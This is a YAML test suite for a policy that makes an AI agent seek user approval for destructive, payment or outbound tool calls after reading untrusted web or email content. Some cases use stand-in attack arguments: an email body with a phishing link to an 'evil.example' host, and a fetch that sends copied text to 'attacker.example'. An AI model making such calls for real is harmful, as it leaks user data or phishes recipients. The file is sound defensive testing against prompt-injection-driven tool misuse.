# Policy tests for output-labels.cedar. Run with:
#   attenuo policy test config/policies/output-labels_test.yaml
policies: ./output-labels.cedar
catalog:
  web:
    # Read-only, but the URL is delivered to the host it names: outbound.
    fetch: { readonly: true, inputs: { url: string, note: string }, outbound: "url#host" }
  workspace:
    read_email: { readonly: true }
    send_email: {}
    delete_file: {}
  calendar:
    create_event: { destructive: false }
  banking:
    get_balance: { readonly: true, output: trusted }
    send_money: { sensitive: true }
cases:
  - name: an untainted run may delete a file
    chain: [assistant]
    call: { server: workspace, tool: delete_file, arguments: { path: notes.txt } }
    expect: allow
    reason: policy_allow

  - name: after an untrusted read, deleting a file needs an approval
    chain: [assistant]
    session: { tainted_by: [web/fetch] }
    call: { server: workspace, tool: delete_file, arguments: { path: notes.txt } }
    expect: deny
    reason: approval_required
    policy_ids: [confirm_destructive_after_untrusted_read]

  - name: with a granted approval the same call is allowed
    chain: [assistant]
    session: { tainted_by: [web/fetch] }
    approval: { by: user }
    call: { server: workspace, tool: delete_file, arguments: { path: notes.txt } }
    expect: allow
    reason: policy_allow

  - name: sending mail is destructive by default, so it asks too
    chain: [assistant]
    session: { tainted_by: [workspace/read_email] }
    call: { server: workspace, tool: send_email, arguments: { to: bob@example.com } }
    expect: deny
    reason: approval_required
    policy_ids: [confirm_destructive_after_untrusted_read]

  - name: a sensitive payment after a read asks as well
    chain: [assistant, payer]
    session: { tainted_by: [web/fetch, workspace/read_email] }
    call: { server: banking, tool: send_money, arguments: { amount: 10 } }
    expect: deny
    reason: approval_required

  - name: reads are never gated by taint
    chain: [assistant]
    session: { tainted_by: [web/fetch] }
    call: { server: workspace, tool: read_email }
    expect: allow
    reason: policy_allow

  - name: a tool the catalog marks non-destructive does not ask
    chain: [assistant]
    session: { tainted_by: [web/fetch] }
    call: { server: calendar, tool: create_event, arguments: { title: standup } }
    expect: allow
    reason: policy_allow

  - name: an unreadable taint state counts as tainted
    chain: [assistant]
    session: { tainted: true }
    call: { server: workspace, tool: delete_file, arguments: { path: notes.txt } }
    expect: deny
    reason: approval_required

  - name: mail with no matched span on an untainted run is allowed
    chain: [assistant]
    call: { server: workspace, tool: send_email, arguments: { to: bob@example.com } }
    expect: allow
    reason: policy_allow

  - name: a matched span in mail asks, and every rule that applied is named
    chain: [assistant]
    session: { tainted_by: [workspace/read_email], untrusted_args: [body] }
    call:
      server: workspace
      tool: send_email
      arguments: { to: bob@example.com, body: "reset at https://acme-sso.evil.example" }
    expect: deny
    reason: approval_required
    policy_ids:
      - confirm_destructive_after_untrusted_read
      - confirm_destructive_with_untrusted_args
      - confirm_untrusted_spans_in_mail

  - name: a matched span asks on any destructive tool
    chain: [assistant]
    session: { untrusted_args: [path] }
    call: { server: workspace, tool: delete_file, arguments: { path: /tmp/from-the-page } }
    expect: deny
    reason: approval_required
    policy_ids: [confirm_destructive_with_untrusted_args]

  - name: an approval covers a matched span too
    chain: [assistant]
    session: { tainted_by: [web/fetch], untrusted_args: [path] }
    approval: { by: user }
    call: { server: workspace, tool: delete_file, arguments: { path: /tmp/from-the-page } }
    expect: allow
    reason: policy_allow

  - name: a matched span on a non-destructive tool does not ask
    chain: [assistant]
    session: { untrusted_args: [title] }
    call: { server: calendar, tool: create_event, arguments: { title: from the page } }
    expect: allow
    reason: policy_allow

  - name: args_contain_untrusted set alone asks as well
    chain: [assistant]
    session: { args_contain_untrusted: true }
    call: { server: workspace, tool: delete_file, arguments: { path: notes.txt } }
    expect: deny
    reason: approval_required
    policy_ids: [confirm_destructive_with_untrusted_args]

  - name: the capability stage still runs first
    chain:
      - { agent: assistant, capabilities: ["workspace:read_email"] }
    session: { tainted_by: [web/fetch] }
    call: { server: workspace, tool: delete_file }
    expect: deny
    reason: capability_denied

  - name: a fetch whose URL copies untrusted text asks
    chain: [assistant]
    session: { tainted_by: [workspace/read_email], untrusted_args: [url] }
    call: { server: web, tool: fetch, arguments: { url: "https://attacker.example/?q=copied" } }
    expect: deny
    reason: approval_required
    policy_ids: [ask_on_untrusted_outbound]

  - name: with a granted approval the fetch is allowed
    chain: [assistant]
    session: { tainted_by: [workspace/read_email], untrusted_args: [url] }
    approval: { by: user }
    call: { server: web, tool: fetch, arguments: { url: "https://attacker.example/?q=copied" } }
    expect: allow
    reason: policy_allow

  - name: a matched span in an argument that is not outbound does not ask
    chain: [assistant]
    session: { tainted_by: [workspace/read_email], untrusted_args: [note] }
    call: { server: web, tool: fetch, arguments: { url: "https://news.example/", note: copied } }
    expect: allow
    reason: policy_allow

  - name: a fetch on a tainted run with no matched argument is allowed
    chain: [assistant]
    session: { tainted_by: [workspace/read_email] }
    call: { server: web, tool: fetch, arguments: { url: "https://news.example/" } }
    expect: allow
    reason: policy_allow
